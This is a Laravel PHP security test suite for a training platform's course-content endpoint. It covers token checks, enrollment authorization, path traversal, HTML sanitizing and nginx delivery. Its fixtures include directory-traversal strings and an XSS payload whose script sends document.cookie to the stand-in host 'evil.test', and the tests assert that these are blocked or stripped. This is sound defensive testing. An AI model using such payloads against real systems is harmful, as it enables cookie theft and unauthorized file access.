<?php

namespace Tests\Feature;

use App\Models\Aircraft;
use App\Models\Aukstructure;
use App\Models\Category;
use App\Models\Course;
use App\Models\Group;
use App\Models\Group2learning;
use App\Models\Link;
use App\Models\User;
use App\Services\CoursePlayerService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Безопасность и корректность CourseContentController (выдача материала для iframe).
 *
 * Слои проверки:
 *  1. Аутентификация: аноним, мусорный/фальшивый/revoked/expired токен в ?t=.
 *     (iframe не шлёт заголовки — токен в query; контроллер сверяет sha256
 *     вручную, поэтому здесь проверяется именно эта ручная сверка.)
 *  2. Авторизация доступа к содержимому (Д12): незаписанный → 403, чужая
 *     специальность → 403, записанный/управляющий → 200.
 *  3. Обход каталогов: traversal («..», %2e%2e), NUL, symlink-выход за root.
 *  4. XSS-санитайзер: on*-атрибуты и <script> вырезаются из HTML материала.
 *  5. Контракт выдачи: no-store (Д1), <base href> на auth-endpoint, серверная
 *     подсветка термина (?highlight), MIME для бинарных материалов.
 *
 * Файлы контента разворачиваются во временный каталог и подключаются как
 * диск 'private' — тесты не зависят от боевой выкладки РЭТ (тот же приём,
 * что в PrivateContentSignatureTest).
 */
class CourseContentSecurityTest extends TestCase
{
    use RefreshDatabase;
    use AuthenticatesApi;

    private string $contentRoot;

    protected function setUp(): void
    {
        parent::setUp();

        $this->contentRoot = storage_path('framework/testing/content-' . uniqid());
        File::ensureDirectoryExists($this->contentRoot);
        config(['filesystems.disks.private.root' => $this->contentRoot]);
        Storage::forgetDisk('private');
    }

    protected function tearDown(): void
    {
        if (is_dir($this->contentRoot)) {
            File::deleteDirectory($this->contentRoot);
        }
        parent::tearDown();
    }

    /* ─────────────────────────── фикстуры ─────────────────────────── */

    /** Курс + самолёт с реальным файлом материала на диске private. */
    private function fixture(array $htmlOverride = []): array
    {
        $aircraft = Aircraft::factory()->create(['path' => 'ИЛ-76']);
        $course = Course::factory()->create([
            'aircraft_id' => $aircraft->id,
            'path' => 'kurs-01',
            'visible' => true,
        ]);

        $item = Aukstructure::factory()->create([
            'course_id' => $course->id,
            'type' => CoursePlayerService::TYPE_MATERIAL,
            'title' => 'Аэродинамика',
        ]);
        Link::create(['aukstructure_id' => $item->id, 'link' => 'aerodinamika.html']);

        $dir = $this->contentRoot . '/private/ИЛ-76/kurs-01';
        File::ensureDirectoryExists($dir);
        File::put(
            $dir . '/aerodinamika.html',
            $htmlOverride['aerodinamika.html'] ?? '<html><head></head><body><h1>Аэродинамика профиля крыла</h1></body></html>'
        );

        return [$aircraft, $course, $item];
    }

    private function enrolledTrainee(Course $course): User
    {
        $group = Group::factory()->create();
        $user = User::factory()->create(['role' => 'Обучаемый', 'group_id' => $group->id]);
        Group2learning::factory()->create([
            'group_id' => $group->id,
            'course_id' => $course->id,
            'category_id' => null,
            'parent_id' => null,
        ]);

        return $user;
    }

    /* ═══════════════ 1. Аутентификация (sanctum / web / ?t=) ═══════════════ */

    public function test_anonymous_cannot_open_content_or_raw(): void
    {
        [, $course, $item] = $this->fixture();

        // Без Authorization и без ?t= — строго 401, а не «пустой кадр» или 403.
        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertStatus(401);
        $this->getJson("/api/course/{$course->id}/raw/aerodinamika.html")->assertStatus(401);
    }

    public function test_garbage_query_token_is_rejected(): void
    {
        [, $course, $item] = $this->fixture();

        foreach (['abc', '9999|notahash', '0000000000|deadbeef', '1|' . str_repeat('f', 64)] as $junk) {
            $this
                ->getJson("/api/course/{$course->id}/content/{$item->id}?t=" . urlencode($junk))
                ->assertStatus(401, "Мусорный токен '{$junk}' был принят");
        }
    }

    public function test_valid_query_token_opens_frame_without_header(): void
    {
        // Сценарий iframe: заголовка Authorization нет, есть только ?t=<plain token>.
        [, $course, $item] = $this->fixture();
        $user = $this->enrolledTrainee($course);
        $token = $user->createToken('frame')->plainTextToken;

        $this->get("/api/course/{$course->id}/content/{$item->id}?t={$token}")
            ->assertOk()
            ->assertHeader('Cache-Control', 'no-store, max-age=0');
    }

    public function test_revoked_token_is_rejected_for_frames(): void
    {
        [, $course, $item] = $this->fixture();
        $user = $this->enrolledTrainee($course);
        $token = $user->createToken('frame')->plainTextToken;

        DB::table('personal_access_tokens')
            ->where('id', explode('|', $token)[0])
            ->update(['revoked_at' => now()]);

        $this->getJson("/api/course/{$course->id}/content/{$item->id}?t={$token}")->assertStatus(401);
    }

    public function test_expired_token_is_rejected_for_frames(): void
    {
        // Граничный случай из ТЗ: «доступ по просроченной подписи/пути».
        // Для кадров роль подписи играет TTL sanctum-токена.
        [, $course, $item] = $this->fixture();
        $user = $this->enrolledTrainee($course);
        $token = $user->createToken('frame')->plainTextToken;

        DB::table('personal_access_tokens')
            ->where('id', explode('|', $token)[0])
            ->update(['expires_at' => now()->subMinute()]);

        $this->getJson("/api/course/{$course->id}/content/{$item->id}?t={$token}")->assertStatus(401);
    }

    public function test_forged_secret_with_real_token_id_is_rejected(): void
    {
        // Подделка: id существующего токена + неверный секрет. hash_equals по
        // sha256 обязан отказать — иначе перебор id открывает любой курс.
        [, $course, $item] = $this->fixture();
        $user = $this->enrolledTrainee($course);
        $token = $user->createToken('frame')->plainTextToken;
        $forged = explode('|', $token)[0] . '|' . str_repeat('a', 40);

        $this->getJson("/api/course/{$course->id}/content/{$item->id}?t={$forged}")->assertStatus(401);
    }

    /* ══════════════ 2. Авторизация содержимого (CourseAccess) ══════════════ */

    public function test_unenrolled_student_gets_403_on_foreign_course_content(): void
    {
        [, $course, $item] = $this->fixture();

        $outsider = $this->asUser(['role' => 'Обучаемый', 'group_id' => null]);

        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertStatus(403);
        $this->getJson("/api/course/{$course->id}/raw/aerodinamika.html")->assertStatus(403);
    }

    public function test_enrolled_student_reads_own_material(): void
    {
        [, $course, $item] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        $this->get("/api/course/{$course->id}/content/{$item->id}")
            ->assertOk()
            ->assertSee('Аэродинамика профиля крыла', false);
    }

    public function test_admin_manages_and_opens_any_content(): void
    {
        [, $course, $item] = $this->fixture();
        $this->admin();

        $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk();
    }

    public function test_specialty_gate_blocks_foreign_category_module(): void
    {
        // Пилот не получает материалы бортинженера: запись группы в категорию A,
        // материал привязан к категории B → 403 даже при записи на курс.
        [$aircraft, $course, $item] = $this->fixture();

        $catA = Category::factory()->create();
        $catB = Category::factory()->create();
        DB::table('category_course')->insert([
            ['course_id' => $course->id, 'category_id' => $catA->id],
            ['course_id' => $course->id, 'category_id' => $catB->id],
        ]);
        DB::table('aukstructure_category')->insert([
            'aukstructure_id' => $item->id,
            'category_id' => $catB->id,
        ]);

        $group = Group::factory()->create();
        $user = User::factory()->create(['role' => 'Обучаемый', 'group_id' => $group->id]);
        Group2learning::factory()->create([
            'group_id' => $group->id,
            'course_id' => $course->id,
            'category_id' => $catA->id,
            'parent_id' => null,
        ]);

        $this->asExistingUser($user);
        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertStatus(403);
    }

    /* ═══════════════════ 3. Обход каталогов и поддельные id ═══════════════════ */

    public function test_traversal_in_raw_path_is_blocked(): void
    {
        [, $course] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        // За пределами корня курса кладём «секрет»: если traversal не отсеян,
        // файл прочитается.
        File::put($this->contentRoot . '/secret.txt', 'СЕКРЕТ ЗА ПРЕДЕЛАМИ КУРСА');

        foreach (
            [
                '../secret.txt',
                '..%2Fsecret.txt',          // URL-кодированный разделитель
                'kurs-01/../../secret.txt',
                '....//secret.txt',
                'kurs-01\/..\secret.txt',   // windows-разделители
            ] as $evil
        ) {
            $res = $this->getJson("/api/course/{$course->id}/raw/" . $evil);
            $this->assertTrue(
                in_array($res->status(), [403, 404], true),
                "traversal '{$evil}' вернул {$res->status()} вместо 403/404"
            );
            $res->assertDontSee('СЕКРЕТ', false);
        }
    }

    public function test_nul_byte_in_path_is_blocked(): void
    {
        [, $course] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        $this->getJson("/api/course/{$course->id}/raw/aerodinamika.html%00.txt")
            ->assertStatus(403);
    }

    public function test_forged_item_id_from_foreign_course_is_not_served(): void
    {
        // id узла существует, но лежит в другом курсе → firstOrFail по паре
        // (course_id, id) обязан дать 404, а не прочитать чужой файл.
        [, $courseA, $itemA] = $this->fixture();
        $courseB = Course::factory()->create(['path' => 'chuzhoj-kurs']);
        $itemB = Aukstructure::factory()->create(['course_id' => $courseB->id, 'type' => 3]);
        Link::create(['aukstructure_id' => $itemB->id, 'link' => 'other.html']);

        $this->asExistingUser($this->enrolledTrainee($courseA));

        $this->getJson("/api/course/{$courseA->id}/content/{$itemB->id}")->assertStatus(404);
    }

    public function test_missing_file_on_disk_returns_404_not_500(): void
    {
        [, $course, $item] = $this->fixture();
        File::delete($this->contentRoot . '/private/ИЛ-76/kurs-01/aerodinamika.html');

        $this->asExistingUser($this->enrolledTrainee($course));
        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertStatus(404);
    }

    public function test_node_without_link_returns_404(): void
    {
        $course = Course::factory()->create();
        $item = Aukstructure::factory()->create(['course_id' => $course->id, 'type' => 3]);

        $this->admin();
        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertStatus(404);
    }

    /**
     * ✅ Дефект №1 ИСПРАВЛЕН: CourseContentController::show() теперь фильтрует
     * type==3 (CoursePlayerService::TYPE_MATERIAL), как и /view. Раздел с
     * проставленной ссылкой отдаёт 404, а не «материал».
     */
    public function test_section_node_must_not_be_served_as_material(): void
    {
        [$aircraft, $course] = $this->fixture();
        $section = Aukstructure::factory()->create([
            'course_id' => $course->id, 'type' => 2, 'title' => 'Раздел',
        ]);
        Link::create(['aukstructure_id' => $section->id, 'link' => 'aerodinamika.html']);

        $this->admin();
        $this->getJson("/api/course/{$course->id}/content/{$section->id}")->assertStatus(404);
    }

    public function test_material_node_is_still_served_after_type_filter(): void
    {
        // Позитивная пара к фиксу №1: фильтр type==3 не должен отрезать
        // настоящие материалы — иначе регрессия «пустой плеер» уедет в прод.
        // fixture() возвращает [aircraft, course, item] — item уже type 3
        // со ссылкой и файлом на диске.
        [$aircraft, $course, $item] = $this->fixture();

        $this->admin();
        $this->getJson("/api/course/{$course->id}/content/{$item->id}")->assertOk();
    }

    /* ═════════════════ 4. Санитайзер: material не тянет JS ═════════════════ */

    public function test_inline_handlers_and_scripts_are_stripped(): void
    {
        $malicious = '<html><head><script>window.location="https://evil.test?c="+document.cookie</script></head>'
            . '<body onload="alert(1)"><a href="#" onclick="steal()">ссылка</a>'
            . '<img src="x" ONERROR="pwn()"></body></html>';

        [, $course, $item] = $this->fixture(['aerodinamika.html' => $malicious]);
        $this->asExistingUser($this->enrolledTrainee($course));

        $content = $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk()->getContent();

        $this->assertStringNotContainsString('<script', strtolower($content));
        $this->assertStringNotContainsString('onload=', strtolower($content));
        $this->assertStringNotContainsString('onclick=', strtolower($content));
        $this->assertStringNotContainsString('onerror=', strtolower($content));
        // сам контент ссылки остаётся — санитайзер режет обработчики, а не текст
        $this->assertStringContainsString('ссылка', $content);
    }

    /* ═════════ 5. Контракт выдачи: base-href, no-store, highlight ═════════ */

    public function test_base_href_points_to_auth_raw_endpoint(): void
    {
        [, $course, $item] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        $content = $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk()->getContent();

        // Д1: ресурсы кадра резолвятся через авторизованный raw-endpoint этого курса
        $this->assertMatchesRegularExpression(
            '~<base href="[^"]*api/course/' . $course->id . '/raw/~i',
            $content
        );
        // ответ с <base> никогда не кэшируется (протухшая подпись невозможна)
        $this->assertHeader('Cache-Control', 'no-store, max-age=0');
    }

    public function test_existing_author_base_is_replaced_not_duplicated(): void
    {
        [, $course, $item] = $this->fixture([
            'aerodinamika.html' => '<html><head><base href="http://old.rét.local/"><title>T</title></head><body>ok</body></html>',
        ]);
        $this->asExistingUser($this->enrolledTrainee($course));

        $content = $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk()->getContent();

        $this->assertStringNotContainsString('old.rét.local', $content);
        $this->assertSame(1, preg_match_all('~<base\b~i', $content), 'Дубли <base> ломают резолв ресурсов');
    }

    public function test_highlight_wraps_term_and_escapes_html_of_input(): void
    {
        [, $course, $item] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        // Д5: подсветка считается на сервере тем же DOM, что отдаётся
        $content = $this->get("/api/course/{$course->id}/content/{$item->id}?highlight=крыла")
            ->assertOk()->getContent();

        $this->assertStringContainsString('<span class="cp-hl"', $content);
        $this->assertStringContainsString('.cp-hl{', $content, 'inline-CSS подсветки обязателен для iframe');
    }

    public function test_highlight_shorter_than_three_chars_is_ignored(): void
    {
        [, $course, $item] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        $content = $this->get("/api/course/{$course->id}/content/{$item->id}?highlight=ab")->assertOk()->getContent();
        $this->assertStringNotContainsString('cp-hl', $content);
    }

    public function test_highlight_regex_metachars_do_not_break_document(): void
    {
        // Граничный случай: термин с регексп-метасимволами. preg_quote обязан
        // экранировать — иначе PCRE_ERROR падает на 500 (падение плеера).
        [, $course, $item] = $this->fixture();
        $this->asExistingUser($this->enrolledTrainee($course));

        foreach (['((((', 'a.b*c', '[class]', '?+*'] as $term) {
            $this->get("/api/course/{$course->id}/content/{$item->id}?highlight=" . urlencode($term))
                ->assertOk();
        }
    }

    public function test_binary_material_is_served_with_pdf_mime(): void
    {
        $aircraft = Aircraft::factory()->create(['path' => 'ИЛ-76']);
        $course = Course::factory()->create(['aircraft_id' => $aircraft->id, 'path' => 'kurs-01']);
        $item = Aukstructure::factory()->create(['course_id' => $course->id, 'type' => 3]);
        Link::create(['aukstructure_id' => $item->id, 'link' => 'scan.pdf']);

        $dir = $this->contentRoot . '/private/ИЛ-76/kurs-01';
        File::ensureDirectoryExists($dir);
        File::put($dir . '/scan.pdf', '%PDF-1.4 fake test bytes');

        $this->asExistingUser($this->enrolledTrainee($course));

        $response = $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk();
        $this->assertStringContainsString('application/pdf', $response->headers->get('Content-Type'));
    }

    public function test_accel_mode_delegates_to_nginx_internal_location(): void
    {
        // P1: в режиме X-Accel PHP не гоняет байты — только заголовок.
        [, $course, $item] = $this->fixture();

        // Режим + метка «запрос прошёл через nginx». Метка выводится из
        // APP_KEY (ContentDelivery::accelMarker), подделать её снаружи нельзя —
        // здесь мы эмулируем сам nginx.
        \App\Support\ContentDelivery::writeMode(\App\Support\ContentDelivery::NGINX);
        config(['private_content.accel_marker' => \App\Support\ContentDelivery::accelMarker()]);

        $this->asExistingUser($this->enrolledTrainee($course));
        $this->withHeader(\App\Support\ContentDelivery::ACCEL_HEADER, \App\Support\ContentDelivery::accelMarker());

        $response = $this->get("/api/course/{$course->id}/content/{$item->id}")->assertOk();
        $accel = $response->headers->get('X-Accel-Redirect');
        $this->assertNotNull($accel, 'В accel-режиме материал обязан уходить на internal-location nginx');
        $this->assertStringStartsWith('/_protected-content/', $accel);
        $this->assertSame('', $response->getContent(), 'PHP-воркер не должен отдавать тело в accel-режиме');
        $this->assertStringContainsString('private', (string) $response->headers->get('Cache-Control'));
    }

    public function test_accel_falls_back_to_php_without_nginx_marker(): void
    {
        // Регрессия молчаливой порчи: режим nginx включён, но запрос пришёл
        // мимо nginx (artisan serve). Без метки файл обязан отдать PHP,
        // иначе пользователь видит пустую страницу со статусом 200.
        [, $course, $item] = $this->fixture();
        \App\Support\ContentDelivery::writeMode(\App\Support\ContentDelivery::NGINX);

        $this->asExistingUser($this->enrolledTrainee($course));

        $this->get("/api/course/{$course->id}/content/{$item->id}")
            ->assertOk()
            ->assertHeaderMissing('X-Accel-Redirect')
            ->assertSee('Аэродинамика профиля крыла', false);
    }

    public function test_raw_resource_serves_nested_css(): void
    {
        [, $course] = $this->fixture();
        File::ensureDirectoryExists($this->contentRoot . '/private/ИЛ-76/kurs-01/app');
        File::put($this->contentRoot . '/private/ИЛ-76/kurs-01/app/style.css', 'body{margin:0}');

        $this->asExistingUser($this->enrolledTrainee($course));

        $this->get("/api/course/{$course->id}/raw/app/style.css")
            ->assertOk()
            ->assertSee('body{margin:0}', false);
    }
}
